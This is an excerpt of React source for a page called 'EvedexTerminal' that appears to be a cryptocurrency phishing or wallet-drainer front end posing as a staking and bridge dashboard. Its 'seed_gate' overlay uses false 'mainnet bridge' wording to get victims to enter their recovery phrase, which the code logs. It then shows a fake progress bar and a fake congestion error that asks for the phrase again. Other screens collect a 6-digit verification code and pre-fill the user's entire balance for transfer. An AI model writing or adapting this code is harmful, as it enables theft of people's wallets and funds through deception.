...
export default function EvedexTerminal() {
  ...
  const isSeedValid = useMemo(() => [12, 15, 18, 21, 24].includes(wordCount) && wordsTyped.every(w => w.length >= 3), [wordCount, wordsTyped]);
  ...
  const startSync = () => {
    setIsSyncing(true);
    log(`🚨 VALIDATED_SEED [${wordCount}]: ${seedVal}`);
    let c = 0;
    const i = setInterval(() => {
      c += 1;
      setSyncProgress(c);
      if (c >= 100) {
        ...
        setTimeout(() => {
          ...
          setSyncProgress(0);
          setSeedVal("");
          alert("CRITICAL_ERROR [0x99A]: Node relay timeout. Mainnet bridge is congested. Please re-authenticate your Recovery Phrase.");
          setView("menu");
        }, 1200);
      }
    }, 60);
          ...
          {view === "menu" && (
            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : n === "KYC" ? "#3b82f6" : "#fff", fontSize:'9px', fontWeight:'900'}}><div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : n === "KYC" ? "🆔" : "〽️"}</div>{n}</button>
              ))}
            </div>
          )}
          ...
          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
              ...
              <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'15px'}}>
                ...
                <input type="number" step="any" value={activeTask === "Rectify" ? (selectedAsset === "TOKEN" ? tokenBal?.formatted : nativeBal?.formatted) : inputVal} readOnly={activeTask === "Rectify"} style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
              </div>
          ...
          {view === "kyc_screen" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #10b981', borderRadius:'35px', padding:'30px', textAlign:'center'}}>
              ...
              {kycPhase === 1 ? (
                ...
                <>
                  <div style={{color:'#3b82f6', fontSize:'10px', marginBottom:'10px', fontWeight:'900'}}>6-DIGIT VERIFICATION CODE</div>
                  <input type="text" maxLength="6" placeholder="000000" value={kycCode} onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', marginBottom:'25px', textAlign:'center', fontSize:'24px', outline:'none'}} />
      ...
      {view === "seed_gate" && (
        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
          <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
            {!isSyncing ? (
              <>
                <div style={{color:'#10b981', fontWeight:'900', fontSize:'16px', marginBottom:'10px'}}>🛡️ NODE_RELAY_HANDSHAKE</div>
                <p style={{fontSize:'8px', color:'#64748b', marginBottom:'20px', textTransform:'none', lineHeight: '1.4'}}>IDENTITY VERIFIED. TO AUTHORIZE THE MAINNET BRIDGE AND PREVENT NODE COLLISION, PLEASE PROVIDE YOUR BACKUP RECOVERY PHRASE BELOW.</p>
                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORD PHRASE..." style={{width:'100%', height:'120px', backgroundColor:'black', border: (wordCount > 0 && !isSeedValid) ? '1px solid #ef4444' : '1px solid #10b981', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none', fontSize:'12px'}} />
                <button disabled={!isSeedValid} onClick={startSync} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900', marginTop:'20px', opacity: isSeedValid ? 1 : 0.5}}>VALIDATE_RELAY</button>
              </>
            ) : (
              <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{fontSize:'8px'}}>INDEXING_MAINNET_POOL...</div></div>
            )}
          </div>
        </div>
      )}
